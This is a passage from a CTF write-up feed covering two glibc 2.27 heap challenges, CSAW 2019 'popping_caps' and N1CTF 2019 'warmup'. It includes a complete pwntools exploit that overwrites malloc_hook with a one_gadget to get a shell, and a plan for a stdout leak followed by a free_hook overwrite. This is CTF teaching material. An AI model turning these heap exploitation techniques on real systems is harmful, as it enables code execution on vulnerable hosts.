href="#Exploit-plan" class="headerlink" title="Exploit plan"></a>Exploit plan</h3><p>We can only do 7 actions which is pretty low luckily <strong>libc</strong> is already leaked so we don’t need to waste any actions on doing that. </p><ul><li>Libc version is 2.27 we know that tcache is being used we also know from our analysis above <strong>use after free</strong> is not directly possible so we can already discard <a href="https://github.com/erosjohn/how2heap/blob/master/glibc_2.26/tcache_poisoning.c" target="_blank" rel="noopener">tcache poisoning</a>.</li><li>We can use <a href="https://github.com/erosjohn/how2heap/blob/master/glibc_2.26/tcache_dup.c" target="_blank" rel="noopener">tcache dup</a> which involves double freeing, during the ctf I tried to use this technique but I quickly realized that it used way too many actions  so I also discarded this.</li><li>We can free on any place in the heap so we can use <a href="https://github.com/erosjohn/how2heap/blob/master/glibc_2.26/tcache_house_of_spirit.c" target="_blank" rel="noopener">tcache house of spirit</a> we also need to create a fake chunk in the place we want to write due to security checks.</li><li>Using house of spirit to corrupt tcache_perthread_structs entries is the way to go.</li></ul><p>So the exploit plan is:</p><ol><li>Malloc with size of <strong>0x3a8</strong>.</li><li>free it to increase the counter of that tcachebin(0x100) to 1 <strong>creating</strong> a fake chunk of size <strong>0x100</strong>.</li><li><strong>Free</strong> this fake chunk by using the negative index of -0x210 (House of spirit).</li><li>Malloc with size of <strong>0xf8</strong> will return the pointer at the first tcache entry (size 0x20).</li><li>Edit the first entry with the pointer of <strong>malloc_hook</strong>.</li><li>Malloc with size of <strong>0x20</strong> the pointer returned will be <strong>malloc_hook</strong>.</li><li>Edit malloc_hook with <strong>one_gadget</strong>.</li></ol><h3 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h3><p>The <strong>tcache_perthread_struct</strong> is allocated via <strong>_int_malloc</strong>, so it resides on the heap. The counts member is mostly uninteresting but corrupting the <strong>entries array</strong> makes it possible to do what tcache poisoning does but in less steps.</p><p>The <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L2914" target="_blank" rel="noopener">tcache_pthread_struct</a> is the body of a single tcache thread  and consists of <strong>two arrays</strong>. Among them, the data entries represents the tcache linked list, a total of TCACHE_MAX_BINS (default is 64), the counts array represents the number of memory blocks in each single linked list.</p><p>The data structure is very similar to a <strong>fastbin</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread <span class="keyword">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure></p><p>Constant definition: As can be seen from the constants, in the default configuration, the maximum number of singly linked lists in the structure is 64, and there are up to <strong>7 memory blocks</strong> in each singly linked list. The maximum memory block size that can be accommodated is 0x408 (1032 in decimal).</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS64</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When "x" is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When "x" is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="Debugging-with-GDB"><a href="#Debugging-with-GDB" class="headerlink" title="Debugging with GDB"></a>Debugging with GDB</h3><p>If we want to corrupt the tcache_perthread_struct we need to know where it is located in the heap, <strong>pwndbg</strong> already gives us cool commands like <strong>tcache</strong>, <strong>tcachebins</strong> that show us the linked lists in a pretty way but we kind need to view it in a hexdump view so we can start planing on how to corrupt. </p><p>The heap will only initiate at the <strong>first</strong> allocation so lets allocate and see what happens:<br><a data-fancybox="gallery" href="https://i.imgur.com/lka0IQX.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/lka0IQX.png" alt><br></a><br>So lets look how tcache struct looks like in a hexdump, if we use <strong>p tcache</strong> command in gdb it doesn’t work:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p tcache</span><br><span class="line">Cannot find thread-local storage for process 7678, shared library /lib/x86_64-linux-gnu/libc.so.6:</span><br><span class="line">Cannot find thread-local variables on this target</span><br></pre></td></tr></table></figure><p>We need to do it like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct tcache_perthread_struct *)0x55f21c0fd000</span><br><span class="line">$1 = &#123;</span><br><span class="line">  counts = &quot;\000\000\000\000\000\000\000\000Q\002&quot;, &apos;\000&apos; &lt;repeats 53 times&gt;, </span><br><span class="line">  entries = &#123;0x0 &lt;repeats 64 times&gt;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Showing it as hex dump:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx 0x55f21c0fd000</span><br><span class="line">0x55f21c0fd000: 0x0000000000000000      0x0000000000000251</span><br><span class="line">0x55f21c0fd010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd040: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd0a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd0b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd0c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd0d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd0e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd0f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd110: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd120: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55f21c0fd130: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>Now explaining each field of the struct and why we should <strong>malloc(0x3a8)</strong> to create a fake chunk:<br><a data-fancybox="gallery" href="https://i.imgur.com/1mSk0I1.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/1mSk0I1.png" alt><br></a></p><p>This is what <a href="https://github.com/erosjohn/how2heap/blob/master/glibc_2.26/tcache_house_of_spirit.c" target="_blank" rel="noopener">house of spirit</a> is about, freeing a fake chunk which will be inserted into the tcachebin of that range, next malloc will be written in the position we want write.</p><p>To calculate the offset to free we can simply do some math:<br><a data-fancybox="gallery" href="https://i.imgur.com/G9xzXhn.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/G9xzXhn.png" alt><br></a><br>This is how it looks after freeing the fake chunk:<br><a data-fancybox="gallery" href="https://i.imgur.com/6YTZ5Zi.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/6YTZ5Zi.png" alt><br></a><br>Next <strong>malloc(0xf8)</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/KrJ55qs.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/KrJ55qs.png" alt><br></a><br>Edit with malloc_hook <strong>edit(p64(MALLOC_HOOK))</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/VcM4gHq.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/VcM4gHq.png" alt><br></a><br><strong>Malloc(0x18)</strong> because the pointer is in the tcachebin(0x20):<br><a data-fancybox="gallery" href="https://i.imgur.com/UOct3li.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/UOct3li.png" alt><br></a><br>Malloc returns <strong>malloc_hook</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/XaJDaGW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/XaJDaGW.png" alt><br></a><br>Finally <strong>edit(p64(one_gadget))</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/K0dpbJ3.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/K0dpbJ3.png" alt><br></a><br>The final malloc at <strong>bye</strong> will trigger the hook and we get a shell:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ python popping_caps.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/popping_caps/popping_caps'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/popping_caps/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to pwn.chal.csaw.io on port 1001: Done</span><br><span class="line">[*] SYSTEM 0x7f99382e1440</span><br><span class="line">[*] LIBC 0x7f9938292000</span><br><span class="line">[*] one_gadget 0x7f993839c38c</span><br><span class="line">[*] MALLOC_HOOK 0x7f993867dc30</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">BANG!</span><br><span class="line">Bye!$ ls</span><br><span class="line">flag.txt</span><br><span class="line">popping_caps</span><br><span class="line">$ cat flag.txt</span><br><span class="line">flag&#123;1tsh1ghn000000000n&#125;</span><br></pre></td></tr></table></figure></p><p>The full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"pwn.chal.csaw.io"</span>, <span class="string">"1001"</span>  </span><br><span class="line">filename = <span class="string">"./popping_caps"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: \n'</span>, <span class="string">'1'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'How many: \n'</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: \n'</span>, <span class="string">'2'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Whats in a free: \n'</span>, str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(content)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'Your choice: \n'</span>, <span class="string">'3'</span>)</span><br><span class="line">r.sendafter(<span class="string">'Read me in: \n'</span>, content)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">debug([<span class="number">0xbd0</span>,<span class="number">0xc0e</span>,<span class="number">0xa74</span>]) <span class="comment"># malloc 0xbd0 ; free 0xc0e </span></span><br><span class="line">r.recvuntil(<span class="string">'Here is system '</span>)</span><br><span class="line">SYSTEM = int(r.recvline().rstrip(),<span class="number">16</span>)</span><br><span class="line">LIBC = SYSTEM - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">MALLOC_HOOK = LIBC+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = LIBC +<span class="number">0x10a38c</span></span><br><span class="line">log.info(<span class="string">"SYSTEM 0x%x"</span>%SYSTEM)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span>%LIBC)</span><br><span class="line">log.info(<span class="string">"one_gadget 0x%x"</span>%one_gadget)</span><br><span class="line">log.info(<span class="string">"MALLOC_HOOK 0x%x"</span>% MALLOC_HOOK)</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">add(<span class="number">0x3a8</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">-0x210</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">edit(p64(MALLOC_HOOK))</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">edit(p64(one_gadget))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close() <span class="comment">#</span></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;popping_caps&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;350&lt;/p&gt;
&lt;p&gt;You ever wonder why cowboys have 
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="Tcache" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/"/>
    
      <category term="tcache_perthread_struct" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-perthread-struct/"/>
    
      <category term="House of Spirit" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/House-of-Spirit/"/>
    
    
      <category term="heap" scheme="https://teamrocketist.github.io/tags/heap/"/>
    
      <category term="house_of_spirit" scheme="https://teamrocketist.github.io/tags/house-of-spirit/"/>
    
      <category term="csaw2019" scheme="https://teamrocketist.github.io/tags/csaw2019/"/>
    
      <category term="tcache_perthread_struct" scheme="https://teamrocketist.github.io/tags/tcache-perthread-struct/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] N1CTF 2019 - warmup</title>
    <link href="https://teamrocketist.github.io/2019/09/09/Pwn-N1CTF-2019-warmup/"/>
    <id>https://teamrocketist.github.io/2019/09/09/Pwn-N1CTF-2019-warmup/</id>
    <published>2019-09-09T00:51:13.000Z</published>
    <updated>2019-09-16T01:27:50.379Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>warmup</p></blockquote><blockquote><p><strong>Description</strong>:<br>192</p><p>Solvers 43</p><p>attachment：<a href="https://share.weiyun.com/5NiPNJA" target="_blank" rel="noopener">https://share.weiyun.com/5NiPNJA</a> password：ryzwab</p><p>or</p><p><a href="https://drive.google.com/file/d/14ablm3PSKd1q0RDQUt4rZa-FCy7_wCSo/view?usp=sharing" target="_blank" rel="noopener">https://drive.google.com/file/d/14ablm3PSKd1q0RDQUt4rZa-FCy7_wCSo/view?usp=sharing</a></p><p>nc 47.52.90.3 9999</p></blockquote><h3 id="Info-extracting"><a href="#Info-extracting" class="headerlink" title="Info extracting"></a>Info extracting</h3><p>Binary and libc-2.27.so is given, since is <strong>2.27</strong> version we know that tcache is being used and on this version there isn’t any security checks if a chunk is placed in tcache bin.</p><p>First we start by using the <strong>file</strong> command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file warmup</span><br><span class="line">warmup: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=8b691053c73440b1f889e70408fa631d2a34c6f3, stripped</span><br></pre></td></tr></table></figure><p>With this we know:</p><ul><li>ELF compiled for x86_x64 architecture.</li><li>Dynamically linked.</li><li>Stripped (A little bit harder to reverse).</li></ul><p>Next step is to check protections:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checksec warmup</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/warmup/warmup'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>Brief analysis of these protections:</p><ul><li>FULL RELRO (<strong>GOT</strong> entries are read only we can’t overwrite them)</li><li>STACK CANARY (The stack is protected with the canary if there is a stack overflow we need to find a way to <strong>leak</strong> it)</li><li>The Stack is not executable (We can’t execute shellcode, techniques like <strong>ROP</strong> can bypass this)</li><li>PIE (Position Independent Executable) is on (If we want to use rop we need a way to leak the base address)</li></ul><h3 id="Testing-the-binary"><a href="#Testing-the-binary" class="headerlink" title="Testing the binary"></a>Testing the binary</h3><p>As always for this kind of challenges we are presented with a menu:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ ./warmup </span><br><span class="line">Loading......</span><br><span class="line"><span class="comment">#     #    #     #####  ####### #######</span></span><br><span class="line"><span class="comment">##    #   ##    #     #    #    #</span></span><br><span class="line"><span class="comment"># #   #  # #    #          #    #</span></span><br><span class="line"><span class="comment">#  #  #    #    #          #    #####</span></span><br><span class="line"><span class="comment">#   # #    #    #          #    #</span></span><br><span class="line"><span class="comment">#    ##    #    #     #    #    #</span></span><br><span class="line"><span class="comment">#     #  #####   #####     #    #</span></span><br><span class="line">===========================================</span><br><span class="line">1.add.</span><br><span class="line">2.delete.</span><br><span class="line">3.modify.</span><br><span class="line">4.exit.</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure><p>We can add, delete and modify.</p><p>By adding we can only specify the content:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#     #    #     #####  ####### #######</span></span><br><span class="line"><span class="comment">##    #   ##    #     #    #    #</span></span><br><span class="line"><span class="comment"># #   #  # #    #          #    #</span></span><br><span class="line"><span class="comment">#  #  #    #    #          #    #####</span></span><br><span class="line"><span class="comment">#   # #    #    #          #    #</span></span><br><span class="line"><span class="comment">#    ##    #    #     #    #    #</span></span><br><span class="line"><span class="comment">#     #  #####   #####     #    #</span></span><br><span class="line">===========================================</span><br><span class="line">1.add.</span><br><span class="line">2.delete.</span><br><span class="line">3.modify.</span><br><span class="line">4.exit.</span><br><span class="line">&gt;&gt;1</span><br><span class="line">content&gt;&gt;hello</span><br><span class="line"><span class="keyword">done</span>!</span><br></pre></td></tr></table></figure><p>For delete and edit we can both specify a index in case of modify we can also modify the content we previously added on creation.</p><h3 id="Static-analysis-with-IDA"><a href="#Static-analysis-with-IDA" class="headerlink" title="Static analysis with IDA"></a>Static analysis with IDA</h3><p>Analysis of delete function<br><a data-fancybox="gallery" href="https://i.imgur.com/S5DOdKD.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/S5DOdKD.png" alt><br></a><br>Analysis of add function<br><a data-fancybox="gallery" href="https://i.imgur.com/KXD81t2.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/KXD81t2.png" alt><br></a><br>Analysis of edit function<br><a data-fancybox="gallery" href="https://i.imgur.com/IOQyTRp.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/IOQyTRp.png" alt><br></a></p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>As you have noticed we don’t have any <strong>read/print</strong> function that would allow us to print the contents of the created items because of this we need to find another way to leak a libc address, we can do it by manipulation the <strong>IO_FILE struct</strong> to make <strong>puts</strong> leaking an address.</p><p>The plan is:</p><ul><li>Use tcache dup to overwrite the size of a chunk into a size of unsorted bin range (0x91 for example)</li><li>Fill the tcachebin size 0x91 by freeing it 7 times (max 7)</li><li>One more free will put this chunk into an unsorted bin both <strong>fd</strong> and <strong>bk</strong> are updated into libc addresses from the main arena.</li><li>Do a 4 bit brute force by updating the last 2 bytes of the <strong>fd</strong> libc address to get stdout.</li><li>Resize from 0x91 back to 0x51 so next free gets into a tcache bin again.</li><li>Overwrite <strong>stdout-&gt;_flags</strong> with 0xfbad1800 and <strong>_IO_read_ptr</strong>, <strong>_IO_read_end</strong>, <strong>_IO_read_base</strong> with NULL and the last byte of <strong>_IO_write_base</strong> with NULL.</li><li>Extract libc addresses from next puts.</li><li>Overwrite free_hook with system and modify its fd to <strong>/bin/sh\x00</strong>, Doing a free will get a shell for us.</li></ul><h3 id="Tcache-dup"><a href="#Tcache-dup" class="headerlink" title="Tcache dup"></a>Tcache dup</h3><p>Libc-2.27 uses tcache so every allocated chunk bellow 0x410 when freed is placed in a 